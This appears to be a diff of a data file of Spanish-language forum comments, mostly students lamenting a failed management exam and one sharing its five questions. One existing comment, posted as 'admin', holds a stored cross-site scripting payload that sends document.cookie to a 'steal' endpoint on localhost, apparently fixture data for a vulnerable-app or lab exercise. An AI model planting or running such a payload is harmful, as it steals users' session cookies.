@@ -1,3 +1,7 @@
 4|admin|Hola! Muy bueno che|2025-06-15 19:51:33
 4|admin|Posta... 10 puntos|2025-06-15 19:51:48
 4|admin|<script>fetch('http://localhost:5001/steal?cookie='+document.cookie);</script>|2025-06-15 19:52:13
+0|uliahaff|Estuvo jodidisimo, tengo que ir a recuperatorio directo. Me seria de mucha mucha ayuda si me dan una mano. Me acuerdo la primer pregunta sobre tablero de control... el resto, en blanco jej xDXD|2025-06-17 19:24:05
+0|maleo_96|jajaja, a mi tambien me mato. Me acuerdo que eran 5 a desarollar, entregue en blanco igual....|2025-06-17 19:33:20
+0|juangutierrez|Aca esta las preguntas: <p>1. Explicar tablero de Control</p> 2. Explicar tecnicas de planeamiento</p> <p> 3. V o F. Un ingeniero en sistemas no debe hacerse cargo de las situaciones de Crisis.</p> <p> 4. V o F. Un lider debe ser carismatico para tener exito.</p> <p> 5. V o F. Maslow definio una teoria de simultaneidad de Necesidades.</p>  |2025-06-17 19:48:16
+0|uliahaff|Muchas gracias Juan, te amo <3 =D Salvaste mi año|2025-06-17 19:54:26
